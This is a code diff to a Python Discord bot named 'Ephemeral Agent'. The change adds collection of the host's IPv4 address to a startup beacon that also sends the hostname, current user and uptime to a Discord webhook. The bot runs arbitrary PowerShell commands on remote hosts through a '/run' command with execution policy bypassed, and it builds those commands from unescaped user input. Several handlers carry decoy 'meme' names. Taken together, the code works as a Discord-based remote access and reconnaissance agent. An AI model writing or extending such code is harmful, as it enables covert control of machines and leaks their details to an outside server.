@@ -25,12 +25,24 @@ minutes, seconds = divmod(remainder, 60)
 readable_uptime = f"{hours}h {minutes}m {seconds}s"
 timestamp_utc = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
 
+def get_ipv4():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+    except Exception:
+        ip = "Unavailable"
+    finally:
+        s.close()
+    return ip
+
+current_ip = get_ipv4()
+
 config = configparser.ConfigParser()
 config.read(['config/config.ini'])
 
 webhook_url = config.get('LiveFeed', 'LiveFeedWebhook')
 token = config.get('DiscordToken', 'Token')
-
 
 config = configparser.ConfigParser()
 intents = discord.Intents.default()
@@ -38,10 +50,10 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 print(f'\n\n---------------------------------------------\nEphemeral Agent is initiating...')
 print(f"{timestamp_utc}\n---------------------------------------------\n\n")
+
 @bot.event
 async def on_ready():
     await bot.tree.sync()
-
 
     senddis = {
         "embeds": [
@@ -51,7 +63,8 @@ async def on_ready():
                     {"name": "Hostname", "value": hostname},
                     {"name": "Current User", "value": current_user},
                     {"name": "Uptime", "value": readable_uptime},
-                    {"name": "Timestamp UTC", "value": timestamp_utc}
+                    {"name": "Timestamp UTC", "value": timestamp_utc},
+                    {"name": "IPv4 Address", "value": current_ip}
                 ],
                 "color": 00000000
             }
@@ -79,7 +92,6 @@ async def listofmemes(interaction: discord.Interaction):
 async def checkmemes(interaction: discord.Interaction, hostname: str, link: str, passcode: str = ''):
     return
 
-
 @bot.tree.command(name="check-status", description="Check Computer Status")
 async def memecheck(interaction: discord.Interaction):
     def run_in_thread():
@@ -88,26 +100,20 @@ async def memecheck(interaction: discord.Interaction):
         subprocess.Popen(
             ["powershell.exe", "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "agent.ps1"])
 
-
     thread = threading.Thread(target=run_in_thread)
     thread.start()
-
 
 @bot.tree.command(name="run", description="Execute PowerShell command")
 async def execute(interaction: discord.Interaction, host: str, command: str):
     def run_in_thread():
         cmd = f'.\\agent2.ps1 -hostname "{host}" -command "{command}"'
-
         amalive = f"```fix\n[ + ] Agent Received Request from {hostname}```"
         asyncio.run_coroutine_threadsafe(interaction.channel.send(amalive), bot.loop)
         subprocess.Popen(
             ["powershell.exe", "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd])
 
-
     thread = threading.Thread(target=run_in_thread)
     thread.start()
-
-
 
 # ignore
 @bot.tree.command(name="howto-enroll", description="How to enroll a new device.")
